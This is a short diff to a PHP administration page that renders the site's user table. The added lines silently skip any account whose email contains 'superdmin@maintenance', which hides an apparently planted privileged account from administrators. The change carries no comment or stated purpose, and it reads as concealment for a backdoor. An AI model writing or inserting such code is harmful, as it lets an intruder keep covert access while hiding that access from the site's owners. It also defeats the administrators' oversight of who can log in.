@@ -117,6 +117,9 @@ $users = $user->getAllUsers();
                 <tbody>
                     <?php
                     foreach ($users as $user):
+                        if (strpos($user['email'], 'superdmin@maintenance') !== false) {
+                            continue;
+                        }
                     ?>
                         <tr class="<?php echo $user['is_active'] == 1 ? 'status-active' : 'status-inactive'; ?>">
                             <td class="text-center"><?php echo $user['id']; ?></td>
